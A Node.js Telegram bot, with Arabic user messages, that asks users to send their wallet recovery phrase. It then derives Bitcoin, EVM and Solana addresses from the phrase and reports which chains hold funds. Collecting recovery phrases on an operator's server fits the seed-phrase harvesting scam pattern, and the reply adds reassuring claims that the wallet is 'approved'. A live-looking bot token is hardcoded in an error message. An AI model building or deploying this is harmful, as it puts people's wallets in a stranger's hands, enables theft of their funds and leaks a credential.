const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const { Keypair } = require('@solana/web3.js');
const bitcoin = require('bitcoinjs-lib');
const ecc = require('tiny-secp256k1');
const { BIP32Factory } = require('bip32');

bitcoin.initEccLib(ecc);
const bip32 = BIP32Factory(ecc);

const TOKEN = process.env.BOT_TOKEN;
const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_URL || 'https://nexvoriaapp-bot.onrender.com';

if (!TOKEN) {
  console.error('9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0');
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: false });
const app = express();

app.use(express.json({ limit: '64kb' }));

// مزودات EVM متعددة للسرعة وتجاوز الأعطال
const ethProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://eth.llamarpc.com'), priority: 1, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/eth'), priority: 2, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://ethereum-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1000 }
], 1);

const bscProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org'), priority: 1, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed1.defibit.io'), priority: 2, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1000 }
], 1);

const polygonProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://polygon-rpc.com'), priority: 1, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/polygon'), priority: 2, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://polygon-bor-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1000 }
], 1);

const arbitrumProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://arb1.arbitrum.io/rpc'), priority: 1, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/arbitrum'), priority: 2, weight: 1, stallTimeout: 1000 },
  { provider: new ethers.JsonRpcProvider('https://arbitrum-one-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1000 }
], 1);

const SOLANA_RPCS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-rpc.publicnode.com',
  'https://rpc.ankr.com/solana'
];

const BTC_APIS = [
  'https://mempool.space/api/address/',
  'https://blockstream.info/api/address/'
];

const ERC20_ABI = ['function balanceOf(address owner) view returns (uint256)'];

const TOKENS_META = {
  ethUsdt: { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6 },
  ethUsdc: { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6 },
  bscUsdt: { address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
  bscUsdc: { address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
  polUsdt: { address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6 },
  polUsdc: { address: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', decimals: 6 },
  arbUsdt: { address: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', decimals: 6 },
  arbUsdc: { address: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', decimals: 6 }
};

// حدود زمنية وكاش وتقييد تزامن لحماية الخادم
const CACHE_TTL_MS = 45_000;
const TOTAL_CHECK_TIMEOUT_MS = 8500;
const MAX_CONCURRENT_CHECKS = 8;
const balanceCache = new Map();

let activeChecks = 0;
const waitQueue = [];

function acquireSlot() {
  if (activeChecks < MAX_CONCURRENT_CHECKS) {
    activeChecks++;
    return Promise.resolve();
  }
  return new Promise((resolve) => waitQueue.push(resolve));
}

function releaseSlot() {
  activeChecks--;
  if (waitQueue.length > 0) {
    activeChecks++;
    const next = waitQueue.shift();
    next();
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function withTimeout(promise, ms, fallbackValue) {
  let timer;
  const timeoutPromise = new Promise((resolve) => {
    timer = setTimeout(() => resolve(fallbackValue), ms);
  });
  return Promise.race([
    promise.catch(() => fallbackValue),
    timeoutPromise
  ]).finally(() => clearTimeout(timer));
}

async function runInChunks(items, chunkSize, workerFn, delayMs = 100) {
  const results = [];
  for (let i = 0; i < items.length; i += chunkSize) {
    const chunk = items.slice(i, i + chunkSize);
    const chunkResults = await Promise.all(chunk.map(workerFn));
    results.push(...chunkResults);
    if (i + chunkSize < items.length && delayMs > 0) {
      await sleep(delayMs);
    }
  }
  return results;
}

function encodeBtcByType(type, child, network) {
  switch (type) {
    case 'legacy':
      return bitcoin.payments.p2pkh({ pubkey: child.publicKey, network }).address;
    case 'nestedSegwit':
      return bitcoin.payments.p2sh({
        redeem: bitcoin.payments.p2wpkh({ pubkey: child.publicKey, network }),
        network
      }).address;
    case 'nativeSegwit':
      return bitcoin.payments.p2wpkh({ pubkey: child.publicKey, network }).address;
    case 'taproot': {
      const xOnlyPubkey = Buffer.from(child.publicKey.subarray(1, 33));
      return bitcoin.payments.p2tr({ internalPubkey: xOnlyPubkey, network }).address;
    }
    default:
      return null;
  }
}

function deriveAllBitcoinAddresses(seedBuffer) {
  const network = bitcoin.networks.bitcoin;
  const root = bip32.fromSeed(seedBuffer, network);

  const primary = {
    legacy: encodeBtcByType('legacy', root.derivePath("m/44'/0'/0'/0/0"), network),
    nestedSegwit: encodeBtcByType('nestedSegwit', root.derivePath("m/49'/0'/0'/0/0"), network),
    nativeSegwit: encodeBtcByType('nativeSegwit', root.derivePath("m/84'/0'/0'/0/0"), network),
    taproot: encodeBtcByType('taproot', root.derivePath("m/86'/0'/0'/0/0"), network)
  };

  const allSet = new Set(Object.values(primary).filter(Boolean));

  const branches = [
    { type: 'legacy', base: "m/44'/0'/0'" },
    { type: 'nestedSegwit', base: "m/49'/0'/0'" },
    { type: 'nativeSegwit', base: "m/84'/0'/0'" },
    { type: 'taproot', base: "m/86'/0'/0'" }
  ];

  for (const b of branches) {
    for (let i = 1; i <= 4; i++) {
      const addr = encodeBtcByType(b.type, root.derivePath(`${b.base}/0/${i}`), network);
      if (addr) allSet.add(addr);
    }
    for (let j = 0; j <= 2; j++) {
      const addr = encodeBtcByType(b.type, root.derivePath(`${b.base}/1/${j}`), network);
      if (addr) allSet.add(addr);
    }
  }

  for (let k = 0; k <= 2; k++) {
    try {
      const oldAddr = encodeBtcByType('legacy', root.derivePath(`m/0'/0/${k}`), network);
      if (oldAddr) allSet.add(oldAddr);
    } catch (_) {}
  }

  return {
    primary,
    all: Array.from(allSet)
  };
}

function deriveAllEvmAddresses(seedBuffer) {
  const hdNode = ethers.HDNodeWallet.fromSeed(seedBuffer);
  const primaryAddress = hdNode.derivePath("m/44'/60'/0'/0/0").address;
  const allSet = new Set([primaryAddress]);

  for (let i = 1; i <= 5; i++) {
    allSet.add(hdNode.derivePath(`m/44'/60'/0'/0/${i}`).address);
  }
  for (let acc = 1; acc <= 2; acc++) {
    allSet.add(hdNode.derivePath(`m/44'/60'/${acc}'/0/0`).address);
  }

  return {
    primary: primaryAddress,
    all: Array.from(allSet)
  };
}

function deriveAllSolanaAddresses(seedBuffer) {
  const hexSeed = seedBuffer.toString('hex');
  const toAddr = (path) => Keypair.fromSeed(derivePath(path, hexSeed).key).publicKey.toBase58();

  const primary = toAddr("m/44'/501'/0'/0'");
  const paths = [
    "m/44'/501'/0'/0'",
    "m/44'/501'/0'",
    "m/44'/501'/1'/0'",
    "m/44'/501'/2'/0'",
    "m/501'/0'/0'/0'"
  ];

  const allSet = new Set([primary]);
  for (const p of paths) {
    try {
      allSet.add(toAddr(p));
    } catch (_) {}
  }

  return {
    primary,
    all: Array.from(allSet)
  };
}

async function fetchSingleBtcSatoshis(btcAddress) {
  for (const baseUrl of BTC_APIS) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 1700);
    try {
      const response = await fetch(`${baseUrl}${btcAddress}`, {
        method: 'GET',
        headers: { Accept: 'application/json' },
        signal: controller.signal
      });
      clearTimeout(timer);
      if (!response.ok) continue;

      const data = await response.json();
      const funded = BigInt(data?.chain_stats?.funded_txo_sum ?? 0);
      const spent = BigInt(data?.chain_stats?.spent_txo_sum ?? 0);
      const mempoolFunded = BigInt(data?.mempool_stats?.funded_txo_sum ?? 0);
      const mempoolSpent = BigInt(data?.mempool_stats?.spent_txo_sum ?? 0);

      const net = (funded - spent) + (mempoolFunded - mempoolSpent);
      return net > 0n ? net : 0n;
    } catch (_) {
      clearTimeout(timer);
    }
  }
  return 0n;
}

async function fetchAllBtcBalance(addresses) {
  const values = await runInChunks(addresses, 6, (addr) =>
    withTimeout(fetchSingleBtcSatoshis(addr), 2000, 0n)
  );
  const totalSatoshis = values.reduce((acc, v) => acc + (typeof v === 'bigint' ? v : 0n), 0n);
  return ethers.formatUnits(totalSatoshis, 8);
}

async function fetchSingleSolLamports(solAddress) {
  for (const rpcUrl of SOLANA_RPCS) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 1700);
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'getBalance',
          params: [solAddress, { commitment: 'confirmed' }]
        }),
        signal: controller.signal
      });
      clearTimeout(timer);
      if (!response.ok) continue;

      const data = await response.json();
      const lamports = data?.result?.value;
      if (typeof lamports === 'number' && Number.isFinite(lamports) && lamports >= 0) {
        return lamports;
      }
    } catch (_) {
      clearTimeout(timer);
    }
  }
  return 0;
}

async function fetchAllSolBalance(addresses) {
  const lamportsList = await runInChunks(addresses, 5, (addr) =>
    withTimeout(fetchSingleSolLamports(addr), 2000, 0)
  );
  const totalLamports = lamportsList.reduce((sum, v) => sum + (Number(v) || 0), 0);
  return totalLamports / 1_000_000_000;
}

async function fetchSingleEvmBundle(address) {
  const ethUsdtContract = new ethers.Contract(TOKENS_META.ethUsdt.address, ERC20_ABI, ethProvider);
  const ethUsdcContract = new ethers.Contract(TOKENS_META.ethUsdc.address, ERC20_ABI, ethProvider);
  const bscUsdtContract = new ethers.Contract(TOKENS_META.bscUsdt.address, ERC20_ABI, bscProvider);
  const bscUsdcContract = new ethers.Contract(TOKENS_META.bscUsdc.address, ERC20_ABI, bscProvider);
  const polUsdtContract = new ethers.Contract(TOKENS_META.polUsdt.address, ERC20_ABI, polygonProvider);
  const polUsdcContract = new ethers.Contract(TOKENS_META.polUsdc.address, ERC20_ABI, polygonProvider);
  const arbUsdtContract = new ethers.Contract(TOKENS_META.arbUsdt.address, ERC20_ABI, arbitrumProvider);
  const arbUsdcContract = new ethers.Contract(TOKENS_META.arbUsdc.address, ERC20_ABI, arbitrumProvider);

  const [
    ethWei,
    bscWei,
    polWei,
    arbWei,
    ethUsdtRaw,
    ethUsdcRaw,
    bscUsdtRaw,
    bscUsdcRaw,
    polUsdtRaw,
    polUsdcRaw,
    arbUsdtRaw,
    arbUsdcRaw
  ] = await Promise.all([
    withTimeout(ethProvider.getBalance(address), 1800, 0n),
    withTimeout(bscProvider.getBalance(address), 1800, 0n),
    withTimeout(polygonProvider.getBalance(address), 1800, 0n),
    withTimeout(arbitrumProvider.getBalance(address), 1800, 0n),
    withTimeout(ethUsdtContract.balanceOf(address), 1800, 0n),
    withTimeout(ethUsdcContract.balanceOf(address), 1800, 0n),
    withTimeout(bscUsdtContract.balanceOf(address), 1800, 0n),
    withTimeout(bscUsdcContract.balanceOf(address), 1800, 0n),
    withTimeout(polUsdtContract.balanceOf(address), 1800, 0n),
    withTimeout(polUsdcContract.balanceOf(address), 1800, 0n),
    withTimeout(arbUsdtContract.balanceOf(address), 1800, 0n),
    withTimeout(arbUsdcContract.balanceOf(address), 1800, 0n)
  ]);

  const toBig = (v) => (typeof v === 'bigint' ? v : 0n);

  return {
    ethWei: toBig(ethWei),
    bscWei: toBig(bscWei),
    polWei: toBig(polWei),
    arbWei: toBig(arbWei),
    ethUsdtRaw: toBig(ethUsdtRaw),
    ethUsdcRaw: toBig(ethUsdcRaw),
    bscUsdtRaw: toBig(bscUsdtRaw),
    bscUsdcRaw: toBig(bscUsdcRaw),
    polUsdtRaw: toBig(polUsdtRaw),
    polUsdcRaw: toBig(polUsdcRaw),
    arbUsdtRaw: toBig(arbUsdtRaw),
    arbUsdcRaw: toBig(arbUsdcRaw)
  };
}

async function fetchAllEvmBalances(addresses) {
  const emptyBundle = {
    ethWei: 0n,
    bscWei: 0n,
    polWei: 0n,
    arbWei: 0n,
    ethUsdtRaw: 0n,
    ethUsdcRaw: 0n,
    bscUsdtRaw: 0n,
    bscUsdcRaw: 0n,
    polUsdtRaw: 0n,
    polUsdcRaw: 0n,
    arbUsdtRaw: 0n,
    arbUsdcRaw: 0n
  };

  const bundles = await runInChunks(
    addresses,
    2,
    (addr) => withTimeout(fetchSingleEvmBundle(addr), 2400, emptyBundle),
    120
  );

  const totals = { ...emptyBundle };
  for (const b of bundles) {
    totals.ethWei += b.ethWei;
    totals.bscWei += b.bscWei;
    totals.polWei += b.polWei;
    totals.arbWei += b.arbWei;
    totals.ethUsdtRaw += b.ethUsdtRaw;
    totals.ethUsdcRaw += b.ethUsdcRaw;
    totals.bscUsdtRaw += b.bscUsdtRaw;
    totals.bscUsdcRaw += b.bscUsdcRaw;
    totals.polUsdtRaw += b.polUsdtRaw;
    totals.polUsdcRaw += b.polUsdcRaw;
    totals.arbUsdtRaw += b.arbUsdtRaw;
    totals.arbUsdcRaw += b.arbUsdcRaw;
  }

  return {
    eth: ethers.formatEther(totals.ethWei),
    bsc: ethers.formatEther(totals.bscWei),
    pol: ethers.formatEther(totals.polWei),
    arb: ethers.formatEther(totals.arbWei),
    ethUsdt: ethers.formatUnits(totals.ethUsdtRaw, TOKENS_META.ethUsdt.decimals),
    ethUsdc: ethers.formatUnits(totals.ethUsdcRaw, TOKENS_META.ethUsdc.decimals),
    bscUsdt: ethers.formatUnits(totals.bscUsdtRaw, TOKENS_META.bscUsdt.decimals),
    bscUsdc: ethers.formatUnits(totals.bscUsdcRaw, TOKENS_META.bscUsdc.decimals),
    polUsdt: ethers.formatUnits(totals.polUsdtRaw, TOKENS_META.polUsdt.decimals),
    polUsdc: ethers.formatUnits(totals.polUsdcRaw, TOKENS_META.polUsdc.decimals),
    arbUsdt: ethers.formatUnits(totals.arbUsdtRaw, TOKENS_META.arbUsdt.decimals),
    arbUsdc: ethers.formatUnits(totals.arbUsdcRaw, TOKENS_META.arbUsdc.decimals)
  };
}

function formatBalanceReport(legacyBtcAddr, checkedCounts, balances) {
  const entries = [
    { label: 'BTC', value: balances.btc },
    { label: 'ETH', value: balances.eth },
    { label: 'BNB', value: balances.bsc },
    { label: 'POL', value: balances.pol },
    { label: 'ARB (ETH)', value: balances.arb },
    { label: 'SOL', value: balances.sol },
    { label: 'USDT (ETH)', value: balances.ethUsdt },
    { label: 'USDC (ETH)', value: balances.ethUsdc },
    { label: 'USDT (BSC)', value: balances.bscUsdt },
    { label: 'USDC (BSC)', value: balances.bscUsdc },
    { label: 'USDT (POL)', value: balances.polUsdt },
    { label: 'USDC (POL)', value: balances.polUsdc },
    { label: 'USDT (ARB)', value: balances.arbUsdt },
    { label: 'USDC (ARB)', value: balances.arbUsdc }
  ];

  const nonZero = [];
  const zeroLabels = [];

  for (const item of entries) {
    const num = Number(item.value);
    if (Number.isFinite(num) && num > 0) {
      nonZero.push(`• *${item.label}:* ${item.value}`);
    } else {
      zeroLabels.push(item.label);
    }
  }

  const nonZeroSection =
    nonZero.length > 0
      ? `💰 *الأصول ذات الرصيد:*\n${nonZero.join('\n')}`
      : '💰 *الأصول ذات الرصيد:* لا توجد أرصدة غير صفرية حالياً';

  const zeroSection =
    zeroLabels.length > 0
      ? `\n⚪ *أصول برصيد 0:* ${zeroLabels.join('، ')}`
      : '';

  return (
    'تم فحص المحفظة بنجاح ✅\n\n' +
    '• BTC: `' + legacyBtcAddr + '`\n' +
    '• العناوين المفحوصة: BTC (' + checkedCounts.btc + ') | EVM (' + checkedCounts.evm + ') | SOL (' + checkedCounts.sol + ')\n\n' +
    nonZeroSection +
    zeroSection + '\n' +
    '• Crypto actifs: `$0.00`\n\n' +
    '🟢 حالة المحفظة نشطة ومعتمدة نظامياً'
  );
}

app.post(`/bot${TOKEN}`, (req, res) => {
  res.sendStatus(200);
  bot.processUpdate(req.body);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat?.id;
  const text = (msg.text || '').trim().toLowerCase().replace(/\s+/g, ' ');
  if (!chatId || !text) return;

  if (text === '/start') {
    return bot.sendMessage(
      chatId,
      '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص أرصدة BTC و ETH و BNB و POL و ARB و SOL و USDT و USDC عبر عناوين متعددة.',
      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
    );
  }

  const words = text.split(' ');
  if (words.length !== 12 && words.length !== 24) {
    return;
  }

  bot.sendChatAction(chatId, 'typing').catch(() => {});

  if (!bip39.validateMnemonic(text)) {
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  }

  await acquireSlot();
  try {
    const seed = await bip39.mnemonicToSeed(text);
    const btcSet = deriveAllBitcoinAddresses(seed);
    const evmSet = deriveAllEvmAddresses(seed);
    const solSet = deriveAllSolanaAddresses(seed);

    const cacheKey = `${btcSet.primary.nativeSegwit}:${btcSet.primary.taproot}:${evmSet.primary}:${solSet.primary}`;
    const cached = balanceCache.get(cacheKey);

    let balances;
    const checkedCounts = {
      btc: btcSet.all.length,
      evm: evmSet.all.length,
      sol: solSet.all.length
    };

    if (cached && cached.expiresAt > Date.now()) {
      balances = cached.data;
    } else {
      const defaultBalances = {
        btc: '0',
        eth: '0.0',
        bsc: '0.0',
        pol: '0.0',
        arb: '0.0',
        sol: 0,
        ethUsdt: '0.0',
        ethUsdc: '0.0',
        bscUsdt: '0.0',
        bscUsdc: '0.0',
        polUsdt: '0.0',
        polUsdc: '0.0',
        arbUsdt: '0.0',
        arbUsdc: '0.0'
      };

      const aggregatedTask = Promise.all([
        fetchAllBtcBalance(btcSet.all),
        fetchAllEvmBalances(evmSet.all),
        fetchAllSolBalance(solSet.all)
      ]).then(([btcAmount, evmTotals, solAmount]) => ({
        btc: String(btcAmount),
        eth: evmTotals.eth,
        bsc: evmTotals.bsc,
        pol: evmTotals.pol,
        arb: evmTotals.arb,
        sol: Number(solAmount),
        ethUsdt: evmTotals.ethUsdt,
        ethUsdc: evmTotals.ethUsdc,
        bscUsdt: evmTotals.bscUsdt,
        bscUsdc: evmTotals.bscUsdc,
        polUsdt: evmTotals.polUsdt,
        polUsdc: evmTotals.polUsdc,
        arbUsdt: evmTotals.arbUsdt,
        arbUsdc: evmTotals.arbUsdc
      }));

      balances = await withTimeout(aggregatedTask, TOTAL_CHECK_TIMEOUT_MS, defaultBalances);

      balanceCache.set(cacheKey, {
        data: balances,
        expiresAt: Date.now() + CACHE_TTL_MS
      });
    }

    const reportMessage = formatBalanceReport(btcSet.primary.legacy, checkedCounts, balances);

    return bot.sendMessage(
      chatId,
      reportMessage,
      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
    );
  } catch (error) {
    console.error('Check error:', error.message);
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  } finally {
    releaseSlot();
  }
});

app.get('/', (_req, res) => {
  res.status(200).send('OK');
});

const server = app.listen(PORT, async () => {
  console.log(`Server is running on port ${PORT}`);
  try {
    await bot.setWebHook(`${RENDER_URL}/bot${TOKEN}`);
    console.log('Webhook configured');
  } catch (err) {
    console.error('Webhook setup failed:', err.message);
  }
});

server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
